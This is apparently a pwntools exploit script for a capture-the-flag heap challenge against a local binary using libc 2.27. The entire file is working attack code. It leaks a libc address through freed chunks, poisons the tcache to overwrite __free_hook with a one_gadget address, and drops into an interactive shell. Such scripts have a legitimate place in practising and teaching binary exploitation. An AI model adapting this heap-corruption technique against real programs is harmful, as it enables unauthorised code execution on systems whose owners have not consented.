from pwn import *

context.log_level = 'debug'
context.arch = 'amd64'

p = process('./chall')
e = ELF('./chall')
libc = ELF('./libc-2.27.so')

#gdb.attach(p)
one_gadget = [0x4f365, 0x4f3c2, 0x10a45c]
def add(size, data):
    p.sendlineafter('choice :\n', '1')
    p.sendlineafter('size\n', str(size))
    p.sendafter('data\n', data)

def view():
    p.sendlineafter('choice :\n', '2')
    p.recvuntil('inside\n')

def delete():
    p.sendlineafter('choice :\n', '3')

add(0x20, 'A'*8)
add(0xf7, 'B'*0x10)
delete()
add(0x20, 'C'*8)
add(0xf7, 'D'*0x10)
for _ in range(7):
    delete()
delete()
view()
libc_leak = u64(p.recvuntil('\n')[:-1].ljust(8, "\x00"))
libc_base = libc_leak - 0x3ebc40 - 96
free_hook = libc_base + libc.symbols['__free_hook']
oneshot = libc_base + one_gadget[1]
log.info('libc_leak: ' + hex(libc_leak))
log.info('libc_base: ' + hex(libc_base))
log.info('__free_hook: ' + hex(free_hook))
log.info('one_shot: ' + hex(oneshot))

add(0x20, p64(free_hook))
add(0x20, "P"*8)
add(0x20, p64(oneshot))
add(0xf7, p64(oneshot))

add(0xf7, p64(oneshot))
add(0x20, p64(oneshot))

delete()
p.interactive()
